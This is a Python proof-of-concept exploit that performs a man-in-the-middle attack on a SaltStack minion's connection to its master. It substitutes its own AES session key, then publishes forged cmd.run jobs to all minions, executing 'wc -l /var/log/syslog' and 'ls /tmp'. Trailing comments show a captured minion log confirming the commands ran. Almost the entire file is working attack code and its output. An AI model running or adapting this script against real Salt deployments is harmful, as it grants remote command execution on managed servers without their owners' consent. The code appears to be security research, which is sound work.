#!/usr/bin/env python
import os
import argparse
import tempfile
import pickle

import zmq
import msgpack
from M2Crypto import RSA

import salt.crypt


parser = argparse.ArgumentParser(description="MitM's a minion's connection to a salt-master")
parser.add_argument('--address', '-a', default='tcp://127.0.0.1:4507', help='A ZMQ-URL to bind the socket to')
parser.add_argument('--master', '-m', default='tcp://127.0.0.1:4506', help='A ZMQ-URL pointing to the real salt-master')

def proxy(client_socket, msg):
    client_socket.send(msgpack.dumps(msg))
    return msgpack.loads(client_socket.recv())

def main(args):
    # Initialize our server context
    server_ctx = zmq.Context()
    server_socket = server_ctx.socket(zmq.REP)
    server_socket.bind(args.address)

    # Initialize a client to the real salt-master
    client_ctx = zmq.Context()
    client_socket = client_ctx.socket(zmq.REQ)
    client_socket.connect(args.master)
    print 'start'

    # Get the _auth packet
    print 'auth'
    auth_packet = msgpack.loads(server_socket.recv())

    # Get the real response from the master
    print 'getting resp from master'
    response = proxy(client_socket, auth_packet)

    # Parse the minion's public key
    print 'parsing pub key'
    with tempfile.NamedTemporaryFile() as temp_pub_key:
        temp_pub_key.write(auth_packet['load']['pub'])
        temp_pub_key.flush()
        pub_key = RSA.load_pub_key(temp_pub_key.name)

    # Generate our own AES key and send it to the client
    aes_key = salt.crypt.Crypticle.generate_key_string()
    crypticle = salt.crypt.Crypticle({}, aes_key)
    response['aes'] = pub_key.public_encrypt(aes_key, 4)
    response['publish_port'] = 4508
    print 'sending aes key'
    server_socket.send(msgpack.dumps(response))

    print 'things'


    ## DEL
    auth_packet = msgpack.loads(server_socket.recv())
    print 'getting resp from master'
    response = proxy(client_socket, auth_packet)

    # Parse the minion's public key
    print 'parsing pub key'
    with tempfile.NamedTemporaryFile() as temp_pub_key:
        temp_pub_key.write(auth_packet['load']['pub'])
        temp_pub_key.flush()
        pub_key = RSA.load_pub_key(temp_pub_key.name)

    # Generate our own AES key and send it to the client
    aes_key = salt.crypt.Crypticle.generate_key_string()
    response['aes'] = pub_key.public_encrypt(aes_key, 4)
    print 'sending aes key'
    server_socket.send(msgpack.dumps(response))

    pub_ctx = zmq.Context()
    pub_socket = pub_ctx.socket(zmq.PUSH)
    pub_socket.bind('tcp://127.0.0.1:4508')

    print 'things'
    crypticle2 = salt.crypt.Crypticle({}, aes_key)
    things = msgpack.loads(server_socket.recv())
    pillar = crypticle2.loads(things['load'])
    server_socket.send(msgpack.dumps({
        'enc': 'aes',
        'key': pub_key.public_encrypt(aes_key, 4),
        'pillar': crypticle2.dumps({}),
    }))
    print 'getting crap'
    things = msgpack.loads(server_socket.recv())
    print crypticle.loads(things['load'])
    server_socket.send(msgpack.dumps({
        'enc': 'aes',
        'load': crypticle.dumps(True),
    }))

    print 'sending command'
    pub_socket.send(msgpack.dumps({
        'enc': 'aes',
        'load': crypticle.dumps({
            'tgt_type': 'glob',
            'jid': '20121216060616356457',
            'tgt': '*',
            'ret': '',
            'user': 'sudo_ubuntu',
            'arg': ['wc -l /var/log/syslog'],
            'fun': 'cmd.run',
        }),
    }))
    print 'waiting for response'
    things = msgpack.loads(server_socket.recv())
    print crypticle.loads(things['load'])
    server_socket.send(msgpack.dumps({
        'enc': 'aes',
        'load': crypticle.dumps(True),
    }))

    print 'sending command'
    pub_socket.send(msgpack.dumps({
        'enc': 'aes',
        'load': crypticle.dumps({
            'tgt_type': 'glob',
            'jid': '20121216060616356458',
            'tgt': '*',
            'ret': '',
            'user': 'sudo_ubuntu',
            'arg': ['ls /tmp'],
            'fun': 'cmd.run',
        }),
    }))
    print 'waiting for response'
    things = msgpack.loads(server_socket.recv())
    print crypticle.loads(things['load'])

    #received {'tgt_type': 'glob', 'jid': '20121216060616356454', 'tgt': '*', 'ret': '', 'user': 'sudo_ubuntu', 'arg': ['wc -l /var/log/syslog'], 'fun': 'cmd.run'}
    #[INFO    ] User sudo_ubuntu Executing command cmd.run with jid 20121216060616356454
    #[DEBUG   ] Command details {'tgt_type': 'glob', 'jid': '20121216060616356454', 'tgt': '*', 'ret': '', 'user': 'sudo_ubuntu', 'arg': ['wc -l /var/log/syslog'], 'fun': 'cmd.run'}
    #[INFO    ] Executing command 'wc -l /var/log/syslog' in directory '/home/ubuntu'
    #[DEBUG   ] output: 240 /var/log/syslog
    #[INFO    ] Returning information for job: 20121216060616356454
    #sending {'jid': '20121216060616356454', 'cmd': '_return', 'return': '240 /var/log/syslog', 'id': 'ip-10-240-16-152.ap-southeast-2.compute.internal', 'out': 'txt'}

if __name__ == '__main__':
    args = parser.parse_args()
    main(args)
